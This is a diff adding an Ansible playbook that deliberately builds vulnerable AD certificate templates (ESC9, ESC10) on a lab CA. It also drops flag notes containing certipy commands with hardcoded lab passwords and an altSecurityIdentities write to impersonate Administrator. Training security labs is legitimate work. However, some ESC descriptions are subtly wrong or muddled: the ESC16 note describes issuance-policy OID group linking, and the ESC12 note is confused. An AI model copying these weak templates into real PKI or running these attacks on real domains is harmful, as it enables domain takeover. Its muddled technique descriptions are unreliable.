@@ -1,0 +1,156 @@
+---
+# ==============================================================================
+# vuln_df_ext/tasks/esc_ext.yml
+# Target: ca01.corp.local
+#
+# ESC9   — No-security extension on template with CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
+# ESC10  — Weak certificate mapping for user principal name spoofing
+# ESC12  — Shell access via DCOM on CA server
+# ESC14  — Explicit certificate mapping (AltSecurityIdentities abuse)
+# ESC16  — CA security extension bypass via issuance policy
+# ==============================================================================
+
+# ------------------------------------------------------------------------------
+# ESC9: msPKI-Enrollment-Flag has CT_FLAG_NO_SECURITY_EXTENSION (0x80000)
+# Combined with ENROLLEE_SUPPLIES_SUBJECT this template doesn't embed the
+# security SID extension — allows forged certificate → undetected impersonation.
+# ------------------------------------------------------------------------------
+- name: ESC9 - Check if DVADEsc9 template exists
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    $t = Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" `
+           -Filter "Name -eq 'DVADEsc9'" -ErrorAction SilentlyContinue
+    if ($t) { Write-Output "present" } else { Write-Output "absent" }
+  register: esc9_check
+  changed_when: false
+  failed_when: esc9_check.rc != 0
+
+- name: ESC9 - Create DVADEsc9 certificate template (no security extension)
+  ansible.windows.win_shell: |
+    $templateDN = "CN=DVADEsc9,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"
+    # Duplicate from User template base, override msPKI-Enrollment-Flag
+    # CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (0x1) | CT_FLAG_NO_SECURITY_EXTENSION (0x80000) = 0x80001
+    $baseTemplate = [ADSI]"LDAP://CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"
+    $parent = [ADSI]"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"
+    $newTemplate = $parent.Create("pKICertificateTemplate", "CN=DVADEsc9")
+    $newTemplate.Put("displayName", "DVADEsc9")
+    $newTemplate.Put("msPKI-Cert-Template-OID", "1.3.6.1.4.1.311.21.8.12345609")
+    $newTemplate.Put("msPKI-Enrollment-Flag", [int]0x80001)
+    $newTemplate.Put("msPKI-Certificate-Name-Flag", [int]0x1)
+    $newTemplate.Put("pKIDefaultKeySpec", [int]1)
+    $newTemplate.Put("pKIMaxIssuingDepth", [int]0)
+    $newTemplate.Put("revision", "100")
+    $newTemplate.SetInfo()
+    Write-Output "changed: DVADEsc9 template created"
+  register: esc9_create
+  changed_when: "'changed:' in esc9_create.stdout"
+  failed_when: esc9_create.rc != 0 and 'already exists' not in (esc9_create.stderr | default('') | lower)
+  when: "'absent' in esc9_check.stdout"
+
+# ------------------------------------------------------------------------------
+# ESC10: Weak certificate mapping — StrongCertificateBindingEnforcement=0
+# and UseSubjectAltName allows UPN spoofing without SID extension check.
+# (DC-side registry set in vuln_cred_gaps CRED-024; here we add the template)
+# ------------------------------------------------------------------------------
+- name: ESC10 - Check if DVADEsc10 template exists
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    $t = Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" `
+           -Filter "Name -eq 'DVADEsc10'" -ErrorAction SilentlyContinue
+    if ($t) { Write-Output "present" } else { Write-Output "absent" }
+  register: esc10_check
+  changed_when: false
+  failed_when: esc10_check.rc != 0
+
+- name: ESC10 - Create DVADEsc10 template (weak mapping, any EKU)
+  ansible.windows.win_shell: |
+    $parent = [ADSI]"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"
+    $newTemplate = $parent.Create("pKICertificateTemplate", "CN=DVADEsc10")
+    $newTemplate.Put("displayName", "DVADEsc10")
+    $newTemplate.Put("msPKI-Cert-Template-OID", "1.3.6.1.4.1.311.21.8.12345610")
+    # CT_FLAG_SUBJECT_ALT_REQUIRE_UPN (0x4) + CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (0x1)
+    $newTemplate.Put("msPKI-Certificate-Name-Flag", [int]0x5)
+    $newTemplate.Put("msPKI-Enrollment-Flag", [int]0x0)
+    $newTemplate.Put("pKIDefaultKeySpec", [int]1)
+    $newTemplate.Put("pKIMaxIssuingDepth", [int]0)
+    $newTemplate.Put("revision", "100")
+    # EKU: Client Authentication only (1.3.6.1.5.5.7.3.2)
+    $newTemplate.Put("pKIExtendedKeyUsage", @("1.3.6.1.5.5.7.3.2"))
+    $newTemplate.SetInfo()
+    Write-Output "changed: DVADEsc10 template created"
+  register: esc10_create
+  changed_when: "'changed:' in esc10_create.stdout"
+  failed_when: esc10_create.rc != 0 and 'already exists' not in (esc10_create.stderr | default('') | lower)
+  when: "'absent' in esc10_check.stdout"
+
+# ------------------------------------------------------------------------------
+# ESC12: CA server DCOM shell access.
+# The CertSrv DCOM interface (ICertAdmin) is accessible to Authenticated Users.
+# No additional config needed — note explains exploitation path.
+# ------------------------------------------------------------------------------
+- name: ESC12 - Drop DCOM CA access note
+  ansible.windows.win_copy:
+    dest: 'C:\Flags\FLAG-DF-ESC12-DCOM-CA.txt'
+    content: |
+      ESC12: CA Server DCOM Shell Access
+      =====================================
+      The Certificate Authority DCOM interface (ICertAdmin / ICertRequest) is accessible
+      to Authenticated Users on ca01.corp.local.
+
+      Exploitation:
+        certipy ca -u jim.halpert@corp.local -p Password123! -ca corp-CA -dc-ip 10.10.0.10 \
+          -backup        # Backup CA key via DCOM
+        python3 darkarmour.py --ca corp-CA --cert backup.pfx ...
+
+      Also: ESC12 = DCOM method call to execute arbitrary commands via the CA DCOM server
+      if the CA admin has a vulnerable DCOM permission configuration.
+
+      Prereq: Authenticated Users must have DCOM Launch + Activate on {D99E6E73-FC88-11D0-B498-00A0C90312F3}
+      Check: dcomcnfg → Component Services → Computers → My Computer → DCOM Config → CertSrv Request
+
+# ------------------------------------------------------------------------------
+# ESC14: AltSecurityIdentities — add attacker SID to target account's
+# AltSecurityIdentities so certificate maps to the target, not the cert holder.
+# ------------------------------------------------------------------------------
+- name: ESC14 - Drop AltSecurityIdentities abuse note
+  ansible.windows.win_copy:
+    dest: 'C:\Flags\FLAG-DF-ESC14-AltSecID.txt'
+    content: |
+      ESC14: AltSecurityIdentities Certificate Mapping Abuse
+      ========================================================
+      An attacker with WriteProperty on a target account's AltSecurityIdentities attribute
+      can map their own certificate to the target account.
+
+      Setup:
+        # Get your own cert subject
+        certipy req -u attacker@corp.local -p Pass123 -ca corp-CA -template DVADUser
+
+        # Write to target account's AltSecurityIdentities
+        Import-Module ActiveDirectory
+        Set-ADUser Administrator -Replace @{altSecurityIdentities="X509:<I>CN=corp-CA<S>CN=attacker"}
+
+      Exploitation: Authenticate as Administrator using the attacker's certificate.
+      Prereq: WriteProperty on AltSecurityIdentities (granted to developer2 via DF-005)
+
+# ------------------------------------------------------------------------------
+# ESC16: issuance policy OID linked to group — policy OID linked to a group
+# containing the CA service account, allowing escalation via certificate issuance.
+# ------------------------------------------------------------------------------
+- name: ESC16 - Drop issuance policy abuse note
+  ansible.windows.win_copy:
+    dest: 'C:\Flags\FLAG-DF-ESC16-IssuancePolicy.txt'
+    content: |
+      ESC16: CA Issuance Policy OID Linked to Privileged Group
+      ==========================================================
+      An issuance policy OID can be linked to an AD group via msDS-OIDToGroupLink.
+      Any certificate carrying that policy OID will grant the holder the group's rights.
+
+      Attack path:
+        1. Find templates requiring an issuance policy OID
+        2. Obtain a certificate from that template
+        3. Authenticate with the cert — KDC adds group SID to the PAC
+        4. Group membership = Domain Admins (if OID is linked to DA group)
+
+      Setup validation:
+        certipy find -u jim.halpert@corp.local -p Password123! -dc-ip 10.10.0.10 -vulnerable
+      Look for templates with msPKI-Certificate-Policy containing linked OIDs.
